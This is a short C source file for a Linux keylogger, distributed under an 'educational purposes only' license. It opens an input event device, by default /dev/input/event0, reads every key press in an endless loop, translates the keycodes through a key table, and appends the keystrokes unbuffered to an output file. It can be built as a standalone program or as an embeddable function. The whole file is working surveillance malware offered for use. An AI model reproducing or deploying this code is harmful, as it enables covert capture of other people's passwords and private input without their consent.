/*
 * Copyright (C) 2007-2009 Stealth.
 * All rights reserved.
 *
 * This is NOT a common BSD license, so read on.
 *
 * Redistribution in source and use in binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * 1. The provided software is FOR EDUCATIONAL PURPOSES ONLY! You must not
 *    use this software or parts of it to commit crime or any illegal
 *    activities. Local law may forbid usage or redistribution of this
 *    software in your country.
 * 2. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 3. Redistribution in binary form is not allowed.
 * 4. All advertising materials mentioning features or use of this software
 *    must display the following acknowledgement:
 *      This product includes software developed by Stealth.
 * 5. The name Stealth may not be used to endorse or promote
 *    products derived from this software without specific prior written
 *    permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY
 * EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
 * IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE
 * FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS
 * OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
 * HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT
 * LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY
 * OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF
 * SUCH DAMAGE.
 */

#include <stdio.h>
#include <sys/types.h>
#include <fcntl.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <time.h>
#include <linux/input.h>
#include <string.h>
#include "keytab.h"

void die(const char *msg)
{
	perror(msg);
	exit(errno);
}


#ifdef STANDALONE
int main(int argc, char **argv)
#else
int event_main(int argc, char **argv)
#endif
{
	int fd, r = 0;
	struct input_event ev;
	int keycode_cache[512], k;
	int io_arg[2];
	char *event_file = "/dev/input/event0";
	char *output_file = "/dev/stdout";
	FILE *fout = NULL;

	memset(&keycode_cache, 0, sizeof(keycode_cache));

	if (argc == 2) {
		event_file = argv[1];
	} else if (argc == 3) {
		event_file = argv[1];
		output_file = argv[2];
	}

	if ((fd = open(event_file, O_RDONLY)) < 0)
		die("open");
	if ((fout = fopen(output_file, "a")) == NULL)
		die("fopen");

	setbuffer(fout, NULL, 0);

	for (;;) {
		r = read(fd, &ev, sizeof(ev));

		// key and key-pressed
		if (ev.type == EV_KEY && ev.value == 1 && ev.code < 512) {
			if ((k = keycode_cache[ev.code]) == 0) {
				io_arg[0] = ev.code;
				ioctl(fd, EVIOCGKEYCODE, &io_arg);
				k = io_arg[1];
				if (io_arg[0] < 512)
					keycode_cache[io_arg[0]] = k;
			}
			if (k > 0 && k < 512)
				fprintf(fout, "%s", keytable[k]);
		}
	}
	return 0;
}


